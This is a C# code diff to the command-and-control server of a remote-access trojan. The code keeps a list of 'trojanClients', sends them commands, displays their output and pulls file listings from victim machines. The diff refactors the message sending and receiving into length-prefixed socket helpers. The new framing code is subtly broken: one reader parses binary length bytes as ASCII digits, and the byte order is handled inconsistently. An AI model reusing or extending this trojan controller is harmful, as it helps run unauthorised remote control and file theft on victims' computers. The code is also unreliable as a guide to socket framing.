@@ -48,20 +48,7 @@ namespace Server.TCP
                     {
                         var client = await tcpServer.AcceptTcpClientAsync();
 
-                        int i = 0;
-
-                        NetworkStream stream = client.GetStream();
-
-                        var bytes = new Byte[256];
-                        if (stream.CanRead)
-                        {
-                            i = await stream.ReadAsync(bytes, 0, bytes.Length);
-                        }
-
-                        var clientName = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
-                        trojanClients.Add(new TrojanClient(client, clientName));
-                        serverGUI.SetClients(trojanClients.Select(x => x.Name));
-                        //ThreadPool.QueueUserWorkItem(ThreadProc, client);
+                        await ReceiveFromSocket(client, RegisterClient);
                     }
 
                 }));
@@ -90,30 +77,17 @@ namespace Server.TCP
             {
                 var trojanClient = trojanClients[serverGUI.GetClientId()];
                 var client = trojanClient.Client;
-                var bytes = new Byte[256];
+
 
                 // Get a stream object for reading and writing
 
                 NetworkStream stream = client.GetStream();
-                byte[] msg = null;
                 Command command = new Command(commandId, serverGUI.GetParameters());
                 string output = JsonConvert.SerializeObject(command);
-                msg = System.Text.Encoding.ASCII.GetBytes(output);
                 try
                 {
-
-                    if (stream.CanWrite)
-                    {
-                        await stream.WriteAsync(msg, 0, msg.Length);
-                    }
-                    int i = 0;
-                    if (stream.CanRead)
-                    {
-                        i = await stream.ReadAsync(bytes, 0, bytes.Length);
-                    }
-                    var response = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
-                    Response responseObj = JsonConvert.DeserializeObject<Response>(response);
-                    serverGUI.DisplayOutput(responseObj.response);
+                    SendOnSocket(stream, output);
+                    await ReceiveFromSocket(stream, serverGUI.DisplayOutput);
                 }
                 catch
                 {
@@ -140,6 +114,13 @@ namespace Server.TCP
                 RemoveClient(trojanClient);
         }
 
+        private void RegisterClient(TcpClient client, string clientName)
+        {
+            //var clientName = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
+            trojanClients.Add(new TrojanClient(client, clientName));
+            serverGUI.SetClients(trojanClients.Select(x => x.Name));
+        }
+
         private async void GetFiles(object sender, EventArgs e)
         {
             int clientId = serverGUI.GetClientId();
@@ -153,24 +134,12 @@ namespace Server.TCP
                 // Get a stream object for reading and writing
 
                 NetworkStream stream = client.GetStream();
-                byte[] msg = null;
                 Command command = new Command(0, serverGUI.GetFile());
                 string output = JsonConvert.SerializeObject(command);
-                msg = System.Text.Encoding.ASCII.GetBytes(output);
                 try
                 {
-
-                    if (stream.CanWrite)
-                    {
-                        await stream.WriteAsync(msg, 0, msg.Length);
-                    }
-                    int i = 0;
-                    if (stream.CanRead)
-                    {
-                        i = await stream.ReadAsync(bytes, 0, bytes.Length);
-                    }
-                    var response = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
-                    serverGUI.UpdateList(response);
+                    SendOnSocket(stream, output);
+                    await ReceiveFromSocket(stream, serverGUI.UpdateList);
                 }
                 catch
                 {
@@ -181,6 +150,58 @@ namespace Server.TCP
             else
             {
                 serverGUI.DisplayOutput("Select a client and a command.");
+            }
+        }
+
+        private async void SendOnSocket(NetworkStream stream, string message)
+        {
+
+            byte[] msg = System.Text.Encoding.ASCII.GetBytes(message);
+            byte[] messageLength = BitConverter.GetBytes((Int32)message.Length);
+            if (stream.CanWrite)
+            {
+                await stream.WriteAsync(messageLength, 0, messageLength.Length);
+                await stream.WriteAsync(msg, 0, msg.Length);
+            }
+        }
+
+        private async Task ReceiveFromSocket(NetworkStream stream, Action<string> act)
+        {
+            int i = 0;
+            string responseLength = "";
+            var length = new Byte[4];
+            Byte[] bytes = null;
+            if (stream.CanRead)
+            {
+                i = await stream.ReadAsync(length, 0, 4);
+                responseLength = System.Text.Encoding.ASCII.GetString(length, 0, i);
+
+                bytes = new Byte[Int32.Parse(responseLength)];
+                i = await stream.ReadAsync(bytes, 0, bytes.Length);
+            }
+            string response = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
+            Response responseObj = JsonConvert.DeserializeObject<Response>(response);
+            act(responseObj.response);
+        }
+
+        private async Task ReceiveFromSocket(TcpClient client, Action<TcpClient, string> act)
+        {
+
+            NetworkStream stream = client.GetStream();
+            int i = 0;
+            var length = new Byte[4];
+            Byte[] bytes = null;
+            if (stream.CanRead)
+            {
+                i = await stream.ReadAsync(length, 0, 4);
+                
+                Array.Reverse(length);
+                
+                int lengthNumber = BitConverter.ToInt32(length, 0);
+                bytes = new Byte[lengthNumber];
+                i = await stream.ReadAsync(bytes, 0, bytes.Length);
+                string response = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
+                act(client, response);
             }
         }
     }
